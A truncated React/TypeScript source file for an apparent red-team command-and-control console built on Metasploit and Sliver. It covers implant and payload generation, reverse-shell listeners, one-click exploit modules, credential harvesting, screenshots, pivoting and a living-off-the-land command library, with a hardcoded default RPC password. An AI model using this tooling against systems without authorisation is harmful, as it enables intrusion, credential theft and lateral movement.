import { useState, useEffect, useRef } from 'react'
import {
  Terminal as TerminalIcon, Package, Radio, Database,
  Wifi, WifiOff, RefreshCw, Trash2, Play,
  Copy, Check, Download, ChevronRight,
  Shield, Zap, Eye, EyeOff, X, Crosshair,
  ListChecks, Network, Camera, ArrowUpCircle, KeyRound, BookOpen
} from 'lucide-react'
import Terminal, { TerminalHandle } from '../components/Terminal'
import type { Project } from '../types'

// ── Types ──────────────────────────────────────────────────────────

interface MsfStatus {
  connected: boolean
  version?: string
  sessions?: number
  jobs?: number
}

interface LateralTechnique {
  id: string
  label: string
  description: string
  msf_module: string | null
  ports: number[]
}

interface LateralDiscoveryResult {
  remote_host: string
  platform: string
  is_domain: boolean
  subnets: string[]
  cred_types_available: string[]
  techniques: LateralTechnique[]
  discovery_modules: { name: string; description: string }[]
}

interface SysinfoData {
  hostname: string | null
  os: string | null
  arch: string | null
  username: string | null
  domain: string | null
  is_admin: boolean | null
  local_time: string | null
}

interface C2Session {
  id: string
  msf_session_id?: string
  session_type: string
  platform: string
  arch: string
  remote_host: string
  remote_port: string
  tunnel_peer: string
  via_exploit: string
  via_payload: string
  status: 'active' | 'inactive' | 'lost'
  notes: string
  established_at: string
  last_seen: string
  loot_count: number
  task_count: number
  live: boolean
  sysinfo: SysinfoData | null
}

interface LootEntry {
  id: string
  session_id: string
  loot_type: string
  title: string
  content: string
  source_path: string
  captured_at: string
}

interface PayloadDef {
  value: string
  label: string
  platform: string
  arch: string
  formats: string[]
}

interface Listener {
  job_id: string
  name: string
  started_at: string
  datastore: Record<string, string>
}

interface PostModule {
  name: string
  label: string
  description: string
}

// ── Status badge ───────────────────────────────────────────────────

function SessionStatusBadge({ status, live }: { status: string; live: boolean }) {
  if (status === 'active' && live) {
    return (
      <span className="flex items-center gap-1.5 text-xs font-semibold text-green-400">
        <span className="relative flex h-2 w-2">
          <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-green-400 opacity-75" />
          <span className="relative inline-flex rounded-full h-2 w-2 bg-green-500" />
        </span>
        ACTIVE
      </span>
    )
  }
  if (status === 'lost') {
    return (
      <span className="flex items-center gap-1.5 text-xs font-semibold text-red-400">
        <span className="relative flex h-2 w-2">
          <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-red-400 opacity-75" />
          <span className="relative inline-flex rounded-full h-2 w-2 bg-red-500" />
        </span>
        LOST
      </span>
    )
  }
  return (
    <span className="flex items-center gap-1.5 text-xs font-semibold text-slate-500">
      <span className="inline-flex rounded-full h-2 w-2 bg-slate-600" />
      INACTIVE
    </span>
  )
}

// ── Sliver Panel ───────────────────────────────────────────────────

interface SliverStatus { available: boolean; connected: boolean; version: string | null }
interface SliverListener { job_id: string; name: string; protocol: string; port: number }
interface SliverSession { sliver_id: string; session_type: string; platform: string; arch: string; remote_host: string; hostname: string; username: string; is_privileged: boolean; status: string }
interface SliverGenerateForm { os_target: string; arch: string; lhost: string; lport: string; protocol: string; format: string }

function SliverPanel() {
  const [status, setStatus] = useState<SliverStatus | null>(null)
  const [sessions, setSessions] = useState<SliverSession[]>([])
  const [listeners, setListeners] = useState<SliverListener[]>([])
  const [loading, setLoading] = useState(false)
  const [genForm, setGenForm] = useState<SliverGenerateForm>({ os_target: 'linux', arch: 'amd64', lhost: '', lport: '443', protocol: 'mtls', format: 'exe' })
  const [generating, setGenerating] = useState(false)
  const [genResult, setGenResult] = useState('')
  const [lhostIn, setLhostIn] = useState('')
  const [lportIn, setLportIn] = useState('443')
  const [protoIn, setProtoIn] = useState('mtls')
  const [startingListener, setStartingListener] = useState(false)

  const inputCls = "bg-[#05080d] border border-cyan-900/30 rounded px-2 py-1.5 text-xs text-slate-200 focus:outline-none focus:border-cyan-500/50 w-full"

  useEffect(() => {
    fetch('/api/v1/c2/sliver/status').then(r => r.ok ? r.json() : null).then(d => d && setStatus(d))
  }, [])

  async function refresh() {
    setLoading(true)
    try {
      const [sesRes, lstRes] = await Promise.all([
        fetch('/api/v1/c2/sliver/sessions'),
        fetch('/api/v1/c2/sliver/listeners'),
      ])
      if (sesRes.ok) setSessions(await sesRes.json())
      if (lstRes.ok) setListeners(await lstRes.json())
    } finally {
      setLoading(false)
    }
  }

  async function startListener() {
    if (!lhostIn) return
    setStartingListener(true)
    try {
      await fetch('/api/v1/c2/sliver/listeners', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ protocol: protoIn, lhost: lhostIn, lport: parseInt(lportIn) || 443 }),
      })
      await refresh()
    } finally {
      setStartingListener(false)
    }
  }

  async function stopListener(jobId: string) {
    await fetch(`/api/v1/c2/sliver/listeners/${jobId}`, { method: 'DELETE' })
    await refresh()
  }

  async function generateImplant() {
    setGenerating(true)
    setGenResult('')
    try {
      const res = await fetch('/api/v1/c2/sliver/generate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ...genForm, lport: parseInt(genForm.lport) || 443 }),
      })
      const data = await res.json()
      if (!res.ok) setGenResult('Error: ' + (data.detail || JSON.stringify(data)))
      else setGenResult(data.output || `Generated → ${data.output_path}`)
    } finally {
      setGenerating(false)
    }
  }

  return (
    <div className="glass rounded-xl overflow-hidden border border-purple-900/30">
      <div className="px-4 py-3 border-b border-purple-900/20 flex items-center justify-between">
        <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider flex items-center gap-2">
          <Crosshair size={13} className="text-purple-400" /> Sliver C2
          {status?.available && status.connected && (
            <span className="text-[10px] font-normal text-purple-300 bg-purple-900/30 px-1.5 py-0.5 rounded">{status.version}</span>
          )}
        </span>
        <div className="flex items-center gap-2">
          {status !== null && (
            <span className={`text-[10px] font-semibold ${status.connected ? 'text-green-400' : status.available ? 'text-amber-400' : 'text-slate-600'}`}>
              {status.connected ? 'CONNECTED' : status.available ? 'NOT CONNECTED' : 'NOT INSTALLED'}
            </span>
          )}
          <button onClick={refresh} disabled={loading} className="text-slate-600 hover:text-purple-400 transition-colors">
            <RefreshCw size={12} className={loading ? 'animate-spin' : ''} />
          </button>
        </div>
      </div>

      {!status?.available ? (
        <div className="px-4 py-6 text-center text-xs text-slate-600 space-y-1">
          <p>Sliver is not installed or not configured.</p>
          <p className="text-slate-700">Set <span className="font-mono text-slate-500">SLIVER_CONFIG</span> env var to your operator config path.</p>
        </div>
      ) : (
        <div className="p-3 space-y-3">
          {/* Listeners */}
          <div>
            <div className="text-[10px] font-semibold text-slate-500 uppercase tracking-wider mb-1.5">Listeners</div>
            <div className="grid grid-cols-4 gap-2 items-end mb-2">
              <div className="col-span-1">
                <select value={protoIn} onChange={e => setProtoIn(e.target.value)} className={inputCls} style={{ background: '#05080d' }}>
                  {['mtls','https','http','dns','wg'].map(p => <option key={p} value={p}>{p}</option>)}
                </select>
              </div>
              <div><input value={lhostIn} onChange={e => setLhostIn(e.target.value)} placeholder="LHOST" className={inputCls} /></div>
              <div><input value={lportIn} onChange={e => setLportIn(e.target.value)} placeholder="Port" className={inputCls} /></div>
              <button onClick={startListener} disabled={startingListener || !lhostIn} className="py-1.5 rounded-lg bg-purple-900/40 hover:bg-purple-800/50 border border-purple-700/30 text-xs text-purple-300 transition-all disabled:opacity-40 flex items-center justify-center gap-1">
                {startingListener ? <RefreshCw size={10} className="animate-spin" /> : <Play size={10} />} Start
              </button>
            </div>
            {listeners.length === 0 ? (
              <p className="text-[10px] text-slate-700 italic">No active Sliver listeners</p>
            ) : listeners.map(l => (
              <div key={l.job_id} className="flex items-center gap-3 text-xs py-1.5 border-b border-purple-900/10">
                <span className="relative flex h-1.5 w-1.5 flex-shrink-0">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-purple-400 opacity-75" />
                  <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-purple-500" />
                </span>
                <span className="flex-1 font-mono text-[10px] text-slate-300">{l.protocol}:{l.port}</span>
                <span className="text-slate-600 text-[10px]">#{l.job_id}</span>
                <button onClick={() => stopListener(l.job_id)} className="text-slate-600 hover:text-red-400 transition-colors"><X size={11} /></button>
              </div>
            ))}
          </div>

          {/* Sessions */}
          {sessions.length > 0 && (
            <div>
              <div className="text-[10px] font-semibold text-slate-500 uppercase tracking-wider mb-1.5">Active Implants</div>
              {sessions.map(s => (
                <div key={s.sliver_id} className="flex items-center gap-3 py-1.5 border-b border-purple-900/10 text-xs">
                  <span className={`w-1.5 h-1.5 rounded-full flex-shrink-0 ${s.status === 'active' ? 'bg-green-500' : 'bg-slate-600'}`} />
                  <span className="font-mono text-[10px] text-slate-300 flex-1 truncate">{s.hostname || s.remote_host}</span>
                  <span className="text-[10px] text-slate-500">{s.platform}/{s.arch}</span>
                  {s.is_privileged && <span className="text-[9px] text-yellow-400 bg-yellow-900/20 px-1 rounded">PRIV</span>}
                </div>
              ))}
            </div>
          )}

          {/* Generate Implant */}
          <div className="border-t border-purple-900/20 pt-3">
            <div className="text-[10px] font-semibold text-slate-500 uppercase tracking-wider mb-2">Generate Implant</div>
            <div className="grid grid-cols-2 gap-2 mb-2">
              <div>
                <label className="text-[10px] text-slate-600 mb-0.5 block">OS</label>
                <select value={genForm.os_target} onChange={e => setGenForm(f => ({...f, os_target: e.target.value}))} className={inputCls} style={{ background: '#05080d' }}>
                  {['linux','windows','darwin'].map(o => <option key={o} value={o}>{o}</option>)}
                </select>
              </div>
              <div>
                <label className="text-[10px] text-slate-600 mb-0.5 block">Arch</label>
                <select value={genForm.arch} onChange={e => setGenForm(f => ({...f, arch: e.target.value}))} className={inputCls} style={{ background: '#05080d' }}>
                  {['amd64','arm64','386'].map(a => <option key={a} value={a}>{a}</option>)}
                </select>
              </div>
              <div>
                <label className="text-[10px] text-slate-600 mb-0.5 block">C2 Protocol</label>
                <select value={genForm.protocol} onChange={e => setGenForm(f => ({...f, protocol: e.target.value}))} className={inputCls} style={{ background: '#05080d' }}>
                  {['mtls','https','http','dns'].map(p => <option key={p} value={p}>{p}</option>)}
                </select>
              </div>
              <div>
                <label className="text-[10px] text-slate-600 mb-0.5 block">Format</label>
                <select value={genForm.format} onChange={e => setGenForm(f => ({...f, format: e.target.value}))} className={inputCls} style={{ background: '#05080d' }}>
                  {['exe','shared','shellcode','service'].map(f => <option key={f} value={f}>{f}</option>)}
                </select>
              </div>
              <div>
                <label className="text-[10px] text-slate-600 mb-0.5 block">LHOST</label>
                <input value={genForm.lhost} onChange={e => setGenForm(f => ({...f, lhost: e.target.value}))} placeholder="C2 host" className={inputCls} />
              </div>
              <div>
                <label className="text-[10px] text-slate-600 mb-0.5 block">LPORT</label>
                <input value={genForm.lport} onChange={e => setGenForm(f => ({...f, lport: e.target.value}))} placeholder="443" className={inputCls} />
              </div>
            </div>
            <button
              onClick={generateImplant}
              disabled={generating || !genForm.lhost}
              className="w-full py-1.5 rounded-lg bg-purple-900/40 hover:bg-purple-800/50 border border-purple-700/30 text-xs text-purple-300 transition-all disabled:opacity-40 flex items-center justify-center gap-1.5"
            >
              {generating ? <RefreshCw size={11} className="animate-spin" /> : <Package size={11} />}
              Generate
            </button>
            {genResult && (
              <pre className="mt-2 bg-[#05080d] rounded p-2 text-[10px] font-mono text-slate-300 whitespace-pre-wrap max-h-24 overflow-y-auto border border-purple-900/20">{genResult}</pre>
            )}
          </div>
        </div>
      )}
    </div>
  )
}

// ── Main component ─────────────────────────────────────────────────

export default function C2Console() {
  const [activeTab, setActiveTab] = useState<'sessions' | 'payloads' | 'listeners' | 'attack' | 'loot' | 'postex' | 'lotl'>('sessions')
  const [projects, setProjects] = useState<Project[]>([])
  const [selectedProject, setSelectedProject] = useState('')
  const [msfStatus, setMsfStatus] = useState<MsfStatus>({ connected: false })
  const [sessions, setSessions] = useState<C2Session[]>([])
  const [activeSession, setActiveSession] = useState<C2Session | null>(null)
  const [loot, setLoot] = useState<LootEntry[]>([])
  const [payloads, setPayloads] = useState<PayloadDef[]>([])
  const [listeners, setListeners] = useState<Listener[]>([])
  const [postModules, setPostModules] = useState<PostModule[]>([])
  const [postHistory, setPostHistory] = useState<Array<{id: string; label: string; ts: Date; output: string | null; error: string | null; running: boolean}>>([])
  const [expandedHistory, setExpandedHistory] = useState<Set<string>>(new Set())
  const [loading, setLoading] = useState(false)
  const [copied, setCopied] = useState('')
  const [showLootContent, setShowLootContent] = useState<string | null>(null)

  // LOTL state
  interface LotlCommand { id: string; platform: string; label: string; cmd: string; mitre: string; notes: string }
  interface LotlCategory { id: string; label: string; platforms: string[]; commands: LotlCommand[] }
  const [lotlLib, setLotlLib] = useState<LotlCategory[]>([])
  const [lotlFilter, setLotlFilter] = useState<'all' | 'linux' | 'windows'>('all')
  const [lotlSearch, setLotlSearch] = useState('')
  const [lotlCopied, setLotlCopied] = useState('')

  // Post-ex state
  interface ChecklistItem { id: string; category: string; label: string; done: boolean; done_at: string | null }
  interface PivotRoute { id: string; subnet: string; netmask: string; session_id: string; added_at: string; msf_result: string }
  const [checklist, setChecklist] = useState<ChecklistItem[]>([])
  const [pivotRoutes, setPivotRoutes] = useState<PivotRoute[]>([])
  const [harvestOutput, setHarvestOutput] = useState('')
  const [harvesting, setHarvesting] = useState(false)
  const [upgrading, setUpgrading] = useState(false)
  const [upgradeOutput, setUpgradeOutput] = useState('')
  const [screenshotting, setScreenshotting] = useState(false)
  const [screenshotResult, setScreenshotResult] = useState('')
  const [probing, setProbing] = useState(false)
  const [probeOutput, setProbeOutput] = useState('')
  const [sysinfoRaw, setSysinfoRaw] = useState('')
  const [parsingSysinfo, setParsingSysinfo] = useState(false)
  const [newRouteSubnet, setNewRouteSubnet] = useState('')
  const [newRouteNetmask, setNewRouteNetmask] = useState('255.255.255.0')
  const [addingRoute, setAddingRoute] = useState(false)
  const [lateralResult, setLateralResult] = useState<LateralDiscoveryResult | null>(null)
  const [discoveringLateral, setDiscoveringLateral] = useState(false)
  const terminalRef = useRef<TerminalHandle>(null)
  const wsRef = useRef<WebSocket | null>(null)
  const inputRef = useRef<HTMLInputElement>(null)
  const sessionPollRef = useRef<ReturnType<typeof setInterval> | null>(null)

  // MSF connect form
  const [msfHost, setMsfHost] = useState('127.0.0.1')
  const [msfPort, setMsfPort] = useState('55553')
  const [msfPass, setMsfPass] = useState('seraph')
  const [connecting, setConnecting] = useState(false)
  const [connectError, setConnectError] = useState('')

  // Payload builder form
  const [selPayload, setSelPayload] = useState('')
  const [lhost, setLhost] = useState('')
  const [lport, setLport] = useState('4444')
  const [payloadFmt, setPayloadFmt] = useState('elf')
  const [payloadEncoder, setPayloadEncoder] = useState('none')
  const [payloadIterations, setPayloadIterations] = useState('1')
  const [payloadBadChars, setPayloadBadChars] = useState('')
  const [generatingPayload, setGeneratingPayload] = useState(false)
  const [autoStartListener, setAutoStartListener] = useState(false)

  // Listener form
  const [listenerPayload, setListenerPayload] = useState('linux/x64/meterpreter/reverse_tcp')
  const [listenerLhost, setListenerLhost] = useState('0.0.0.0')
  const [listenerLport, setListenerLport] = useState('4444')
  const [startingListener, setStartingListener] = useState(false)

  // Module run state per card index
  const [runningModule, setRunningModule] = useState<number | null>(null)
  const [moduleResults, setModuleResults] = useState<Record<number, ModuleRunResult>>({})

  // Attack plan
  interface AttackRec {
    module: string
    payload: string
    options: Record<string, string>
    description: string
    confidence: 'high' | 'medium' | 'low'
    match_reason: string
    finding_title: string
    finding_severity: string
    post_modules: string[]
  }
  interface ModuleRunResult {
    error?: string
    job_id?: string | null
    new_session_id?: string | null
    msf_result?: Record<string, unknown>
    timed_out?: boolean
  }
  interface AttackPlanResult {
    recommendations: AttackRec[]
    unmatched_findings: { title: string; severity: string; cve_id: string | null }[]
    target_count: number
    finding_count: number
    matched_count: number
  }
  const [attackPlan, setAttackPlan] = useState<AttackPlanResult | null>(null)
  const [attackPlanError, setAttackPlanError] = useState('')
  const [generatingAttack, setGeneratingAttack] = useState(false)

  // Terminal input
  const [termInput, setTermInput] = useState('')

  useEffect(() => {
    loadProjects()
    checkStatus()
    loadPayloads()
  }, [])

  useEffect(() => {
    if (!selectedProject) return
    loadSessions()
    loadLoot()
    // Auto-sync: poll sessions every 30 s to pick up backend-synced sessions
    const autoSyncTimer = setInterval(loadSessions, 30_000)
    return () => clearInterval(autoSyncTimer)
  }, [selectedProject])

  useEffect(() => {
    if (msfStatus.connected) {
      loadListeners()
    }
  }, [msfStatus.connected])

  useEffect(() => {
    if (activeSession) {
      loadPostModules(activeSession.platform)
      connectTerminal(activeSession)
      setPostHistory([])
      setExpandedHistory(new Set())
      loadChecklist(activeSession.id)
      loadRoutes(activeSession.id)
      setHarvestOutput('')
      setUpgradeOutput('')
      setScreenshotResult('')
      setProbeOutput('')
    }
    return () => { wsRef.current?.close() }
  }, [activeSession?.id])

  useEffect(() => {
    if (activeTab === 'listeners') loadListeners()
    if (activeTab === 'lotl') loadLotl()
  }, [activeTab])

  async function loadProjects() {
    const res = await fetch('/api/v1/projects')
    const data = await res.json()
    setProjects(data)
    if (data.length > 0) setSelectedProject(data[0].id)
  }

  async function checkStatus() {
    const res = await fetch('/api/v1/c2/status')
    if (res.ok) setMsfStatus(await res.json())
  }

  async function loadPayloads() {
    const res = await fetch('/api/v1/c2/payloads')
    if (res.ok) setPayloads(await res.json())
  }

  async function loadLotl() {
    if (lotlLib.length > 0) return
    const res = await fetch('/api/v1/c2/lotl')
    if (res.ok) {
      const data = await res.json()
      setLotlLib(data.categories || [])
    }
  }

  async function loadSessions() {
    if (!selectedProject) return
    const res = await fetch(`/api/v1/c2/sessions?project_id=${selectedProject}`)
    if (res.ok) setSessions(await res.json())
  }

  async function loadLoot() {
    if (!selectedProject) return
    const res = await fetch(`/api/v1/c2/loot?project_id=${selectedProject}`)
    if (res.ok) setLoot(await res.json())
  }

  async function loadListeners() {
    const res = await fetch('/api/v1/c2/listeners')
    if (res.ok) setListeners(await res.json())
  }

  async function loadPostModules(platform: string) {
    const p = platform.toLowerCase().includes('win') ? 'windows' : platform.toLowerCase().includes('linux') ? 'linux' : 'multi'
    const res = await fetch(`/api/v1/c2/post-modules?platform=${p}`)
    if (res.ok) setPostModules(await res.json())
  }

  async function handleConnect() {
    setConnecting(true)
    setConnectError('')
    try {
      const res = await fetch('/api/v1/c2/connect', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ host: msfHost, port: parseInt(msfPort), password: msfPass, ssl: false }),
      })
      if (!res.ok) {
        const err = await res.json()
        setConnectError(err.detail || 'Connection failed')
      } else {
        setMsfStatus(await res.json())
        loadListeners()
      }
    } catch (e: unknown) {
      setConnectError(e instanceof Error ? e.message : 'Connection failed')
    } finally {
      setConnecting(false)
    }
  }

  async function handleSync() {
    if (!selectedProject) return
    setLoading(true)
    try {
      await fetch(`/api/v1/c2/sessions/sync?project_id=${selectedProject}`, { method: 'POST' })
      await loadSessions()
    } finally {
      setLoading(false)
    }
  }

  async function handleKillSession(session: C2Session) {
    await fetch(`/api/v1/c2/sessions/${session.id}?kill=true`, { method: 'DELETE' })
    if (activeSession?.id === session.id) setActiveSession(null)
    loadSessions()
  }

  async function handleGeneratePayload() {
    if (!selPayload || !lhost || !lport) return
    setGeneratingPayload(true)
    try {
      const payload = payloads.find(p => p.value === selPayload)
      const res = await fetch('/api/v1/c2/payloads/generate', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          payload: selPayload,
          lhost,
          lport: parseInt(lport),
          format: payloadFmt,
          arch: payload?.arch === 'x64' ? 'x86_64' : payload?.arch || 'x86_64',
          platform: payload?.platform || 'linux',
          encoder: payloadEncoder,
          iterations: parseInt(payloadIterations) || 1,
          bad_chars: payloadBadChars,
          auto_start_listener: autoStartListener,
        }),
      })
      if (!res.ok) {
        const err = await res.json()
        alert(err.detail || 'Payload generation failed')
        return
      }
      const blob = await res.blob()
      const url = URL.createObjectURL(blob)
      const a = document.createElement('a')
      a.href = url
      const cd = res.headers.get('Content-Disposition') || ''
      const match = cd.match(/filename="(.+)"/)
      a.download = match?.[1] || 'payload.bin'
      a.click()
      URL.revokeObjectURL(url)

      if (autoStartListener) {
        // Listener was auto-started server-side via auto_start_listener flag
        await loadListeners()
        setActiveTab('listeners')
      }
    } finally {
      setGeneratingPayload(false)
    }
  }

  async function handleStartListener() {
    setStartingListener(true)
    try {
      const res = await fetch('/api/v1/c2/listeners/start', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ payload: listenerPayload, lhost: listenerLhost, lport: parseInt(listenerLport) }),
      })
      if (!res.ok) {
        const err = await res.json()
        alert(err.detail || 'Failed to start listener')
      } else {
        await loadListeners()
      }
    } finally {
      setStartingListener(false)
    }
  }

  async function handleStopListener(jobId: string) {
    await fetch(`/api/v1/c2/listeners/${jobId}`, { method: 'DELETE' })
    loadListeners()
  }

  async function handleGenerateAttackPlan() {
    if (!selectedProject) return
    setGeneratingAttack(true)
    setAttackPlanError('')
    setAttackPlan(null)
    try {
      const res = await fetch('/api/v1/c2/attack-plan', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ project_id: selectedProject, lhost }),
      })
      const data = await res.json()
      if (!res.ok) { setAttackPlanError(data.detail || 'Failed to generate plan'); return }
      setAttackPlan(data)
    } catch (e: unknown) {
      setAttackPlanError(e instanceof Error ? e.message : 'Unknown error')
    } finally {
      setGeneratingAttack(false)
    }
  }

  function startSessionPolling(idx: number, knownIds: Set<string>) {
    if (sessionPollRef.current) clearInterval(sessionPollRef.current)
    const deadline = Date.now() + 60_000
    sessionPollRef.current = setInterval(async () => {
      if (!selectedProject) return
      await fetch(`/api/v1/c2/sessions/sync?project_id=${selectedProject}`, { method: 'POST' })
      const res = await fetch(`/api/v1/c2/sessions?project_id=${selectedProject}`)
      if (res.ok) {
        const data: C2Session[] = await res.json()
        setSessions(data)
        const newSession = data.find(s => !knownIds.has(s.id))
        if (newSession) {
          setModuleResults(prev => ({
            ...prev,
            [idx]: { ...prev[idx], new_session_id: newSession.msf_session_id },
          }))
          clearInterval(sessionPollRef.current!)
          sessionPollRef.current = null
          return
        }
      }
      if (Date.now() >= deadline) {
        clearInterval(sessionPollRef.current!)
        sessionPollRef.current = null
        setModuleResults(prev => ({
          ...prev,
          [idx]: { ...prev[idx], timed_out: true },
        }))
      }
    }, 3000)
  }

  async function handleRunModule(rec: AttackRec, idx: number) {
    if (!msfStatus.connected) return
    // Snapshot known session IDs BEFORE the module runs so polling can detect new ones
    const knownSessionIds = new Set(sessions.map(s => s.id))
    setRunningModule(idx)
    setModuleResults(prev => { const n = { ...prev }; delete n[idx]; return n })
    try {
      const res = await fetch('/api/v1/c2/run-module', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          module: rec.module,
          options: rec.options,
          payload: rec.payload,
          project_id: selectedProject,
        }),
      })
      const data = await res.json()
      if (!res.ok) {
        setModuleResults(prev => ({ ...prev, [idx]: { error: data.detail || 'Failed' } }))
      } else {
        setModuleResults(prev => ({ ...prev, [idx]: data }))
        await handleSync()
        // Pure scanners never create sessions — skip polling to avoid false positives
        const _noSession = ['auxiliary/scanner/smtp', 'auxiliary/scanner/nfs', 'auxiliary/scanner/ssl']
        const _isPureScanner = _noSession.some(p => rec.module.startsWith(p))
        // Keep polling for 60s in case reverse shell stages slowly; update card when found
        if (!data.new_session_id && !_isPureScanner) startSessionPolling(idx, knownSessionIds)
      }
    } catch (e: unknown) {
      setModuleResults(prev => ({ ...prev, [idx]: { error: e instanceof Error ? e.message : 'Unknown error' } }))
    } finally {
      setRunningModule(null)
    }
  }

  async function handleRunPostModule(mod: PostModule) {
    if (!activeSession) return
    const entryId = `${mod.name}-${Date.now()}`
    const entry = { id: entryId, label: mod.label, ts: new Date(), output: null, error: null, running: true }
    setPostHistory(prev => [entry, ...prev])
    setExpandedHistory(prev => new Set(prev).add(entryId))
    terminalRef.current?.writeln(`\x1b[33m[*] ${mod.label}\x1b[0m`)
    try {
      const res = await fetch('/api/v1/c2/post-modules/run', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ session_id: activeSession.id, module_name: mod.name }),
      })
      if (!res.body) throw new Error('No stream body')
      const reader = res.body.getReader()
      const decoder = new TextDecoder()
      let accumulated = ''
      while (true) {
        const { done, value } = await reader.read()
        if (done) break
        const text = decoder.decode(value, { stream: true })
        for (const raw of text.split('\n')) {
          const line = raw.startsWith('data: ') ? raw.slice(6) : raw
          if (!line) continue
          if (line === '[DONE]') break
          accumulated += (accumulated ? '\n' : '') + line
          setPostHistory(prev => prev.map(e => e.id === entryId ? { ...e, output: accumulated } : e))
          terminalRef.current?.writeln(line)
          if (line.startsWith('[+] New session')) loadSessions()
        }
      }
      setPostHistory(prev => prev.map(e => e.id === entryId ? { ...e, running: false } : e))
      loadChecklist(activeSession.id)
    } catch (e: unknown) {
      const msg = e instanceof Error ? e.message : 'Unknown error'
      setPostHistory(prev => prev.map(e => e.id === entryId ? { ...e, running: false, error: msg } : e))
    }
  }

  function connectTerminal(session: C2Session) {
    wsRef.current?.close()
    const wsProto = window.location.protocol === 'https:' ? 'wss:' : 'ws:'
    const ws = new WebSocket(`${wsProto}//${window.location.host}/ws/c2/${session.id}`)
    wsRef.current = ws
    terminalRef.current?.clear()

    ws.onmessage = (event) => {
      const msg = JSON.parse(event.data)
      if (msg.type === 'stdout') terminalRef.current?.write(msg.data)
      else if (msg.type === 'stderr') terminalRef.current?.write('\x1b[31m' + msg.data + '\x1b[0m')
      else if (msg.type === 'error') terminalRef.current?.writeln(`\x1b[31m[ERROR] ${msg.data}\x1b[0m`)
    }
    ws.onerror = () => terminalRef.current?.writeln('\x1b[31m[WS ERROR]\x1b[0m')
    ws.onclose = () => terminalRef.current?.writeln('\x1b[90m\r\n[disconnected]\x1b[0m')
  }

  function sendCommand() {
    const cmd = termInput.trim()
    if (!cmd || !wsRef.current || wsRef.current.readyState !== WebSocket.OPEN) return
    wsRef.current.send(JSON.stringify({ action: 'exec', command: cmd }))
    setTermInput('')
  }

  async function loadChecklist(sessionId: string) {
    const res = await fetch(`/api/v1/c2/sessions/${sessionId}/checklist`)
    if (res.ok) setChecklist(await res.json())
  }

  async function loadRoutes(sessionId: string) {
    const res = await fetch(`/api/v1/c2/sessions/${sessionId}/routes`)
    if (res.ok) setPivotRoutes(await res.json())
  }

  async function toggleChecklistItem(itemId: string, done: boolean) {
    if (!activeSession) return
    const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/checklist/${itemId}`, {
      method: 'PATCH',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ done }),
    })
    if (res.ok) setChecklist(await res.json())
  }

  async function handleHarvestCreds() {
    if (!activeSession) return
    setHarvesting(true)
    setHarvestOutput('')
    try {
      const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/harvest-creds`, { method: 'POST' })
      const data = await res.json()
      if (res.ok) {
        setHarvestOutput(data.output + `\n\n[+] ${data.creds_saved} credential(s) saved to vault.`)
        loadLoot()
        loadChecklist(activeSession.id)
      } else {
        setHarvestOutput(`Error: ${data.detail || 'Harvest failed'}`)
      }
    } catch (e: unknown) {
      setHarvestOutput(e instanceof Error ? e.message : 'Unknown error')
    } finally {
      setHarvesting(false)
    }
  }

  async function handleUpgrade() {
    if (!activeSession) return
    setUpgrading(true)
    setUpgradeOutput('')
    try {
      const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/upgrade`, { method: 'POST' })
      if (!res.body) throw new Error('No stream body')
      const reader = res.body.getReader()
      const decoder = new TextDecoder()
      let out = ''
      while (true) {
        const { done, value } = await reader.read()
        if (done) break
        const text = decoder.decode(value, { stream: true })
        for (const raw of text.split('\n')) {
          const line = raw.startsWith('data: ') ? raw.slice(6) : raw
          if (!line || line === '[DONE]') continue
          out += (out ? '\n' : '') + line
          setUpgradeOutput(out)
          if (line.startsWith('[+] New session')) loadSessions()
        }
      }
    } catch (e: unknown) {
      setUpgradeOutput(e instanceof Error ? e.message : 'Unknown error')
    } finally {
      setUpgrading(false)
    }
  }

  async function handleScreenshot() {
    if (!activeSession) return
    setScreenshotting(true)
    setScreenshotResult('')
    try {
      const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/screenshot`, { method: 'POST' })
      const data = await res.json()
      if (res.ok) {
        setScreenshotResult(`Screenshot saved: ${data.path}`)
        loadLoot()
        loadChecklist(activeSession.id)
      } else {
        setScreenshotResult(`Error: ${data.detail || 'Screenshot failed'}`)
      }
    } catch (e: unknown) {
      setScreenshotResult(e instanceof Error ? e.message : 'Unknown error')
    } finally {
      setScreenshotting(false)
    }
  }

  async function handleAddRoute() {
    if (!activeSession || !newRouteSubnet) return
    setAddingRoute(true)
    try {
      const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/routes`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ subnet: newRouteSubnet, netmask: newRouteNetmask }),
      })
      if (res.ok) {
        setPivotRoutes(await res.json())
        setNewRouteSubnet('')
      }
    } finally {
      setAddingRoute(false)
    }
  }

  async function handleRemoveRoute(routeId: string) {
    if (!activeSession) return
    const res = await fetch(`/api/v1/c2/sessions/${activeSession.id}/routes/${routeId}`, { method: 'DELETE' })
    if (res.ok) setPivotRoutes(await res.json())
  }

  async function handleAutoprobe() {
    if (!activeSession) return
    setProbing(true)
    setProbeOutput('Running auto-probe… (this may take up to 90s)')
    const sid = activeSession.id
    const startedAt = new Date().toISOString()
    await fetch(`/api/v1/c2/sessions/${sid}/auto-probe`, { method: 'POST' })
    // Probe runs as a background task (5 commands × up to 15s each = ~75s worst case).
    // Poll every 8s; once the system_info loot entry appears, surface it here.
    let ticks = 0
    const poll = setInterval(async () => {
      ticks++
      const res = await fetch(`/api/v1/c2/loot?project_id=${selectedProject}`)
